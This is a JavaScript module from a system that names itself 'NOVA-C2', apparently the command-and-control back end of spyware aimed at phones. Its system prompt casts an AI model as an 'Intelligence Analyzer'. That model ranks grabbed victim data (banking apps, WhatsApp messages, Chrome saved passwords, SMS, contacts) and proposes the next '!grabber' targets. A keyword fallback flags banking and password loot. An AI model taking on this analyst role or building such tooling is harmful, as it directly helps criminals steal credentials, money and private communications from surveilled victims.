import { callAIWithFallback, parseAIResponse } from './swarm.js'

const ANALYZER_SYSTEM_PROMPT = `You are the Intelligence Analyzer for NOVA-C2.

Your job: Analyze grab results and device data to identify:
1. High-value data found (banking apps, passwords, WhatsApp messages, documents)
2. Next logical targets to investigate
3. Risk/reward of further probing
4. Intelligence summary with actionable items

The grab report has categories: banks, whatsapp, chrome, docs, contacts, sms, call_log, installed, wifi.

OUTPUT FORMAT (strict JSON, no markdown):
{
  "analysis": "Brief analysis of findings",
  "highValueFindings": [
    {"type": "bank|whatsapp|password|document|contact|location", "detail": "What was found", "value": "high|medium|low"}
  ],
  "nextTargets": [
    {"target": "!grabber bank", "reason": "Why this is next", "priority": 1}
  ],
  "riskLevel": "low|medium|high",
  "summary": "One-line exec summary"
}`

export async function analyzeResults(resultsText, session) {
  try {
    const result = await callAIWithFallback(ANALYZER_SYSTEM_PROMPT, [
      { role: 'user', content: `ANALYZE:\n${resultsText.slice(0, 8000)}` },
    ], { complexity: 'medium' })
    return parseAIResponse(result.result)
  } catch {
    return {
      analysis: 'Could not analyze results with AI. Falling back to pattern matching.',
      highValueFindings: fallbackAnalysis(resultsText),
      nextTargets: [],
      riskLevel: 'unknown',
      summary: 'Analysis unavailable — review raw data.',
    }
  }
}

function fallbackAnalysis(text) {
  const findings = []
  const lower = text.toLowerCase()
  if (lower.includes('banque') || lower.includes('bank') || lower.includes('attijari') || lower.includes('bmp') || lower.includes('cfg')) {
    findings.push({ type: 'bank', detail: 'Banking app data detected', value: 'high' })
  }
  if (lower.includes('whatsapp') || lower.includes('wa_')) {
    findings.push({ type: 'whatsapp', detail: 'WhatsApp messages or media found', value: 'high' })
  }
  if (lower.includes('chrome') && (lower.includes('password') || lower.includes('login'))) {
    findings.push({ type: 'password', detail: 'Chrome saved passwords detected', value: 'high' })
  }
  if (lower.includes('.pdf') || lower.includes('.docx') || lower.includes('.xlsx')) {
    findings.push({ type: 'document', detail: 'Documents found (PDF, DOCX, XLSX)', value: 'medium' })
  }
  if (lower.includes('contact') && (lower.includes('phone') || lower.includes('@'))) {
    findings.push({ type: 'contact', detail: 'Contacts with phone/email', value: 'medium' })
  }
  return findings
}
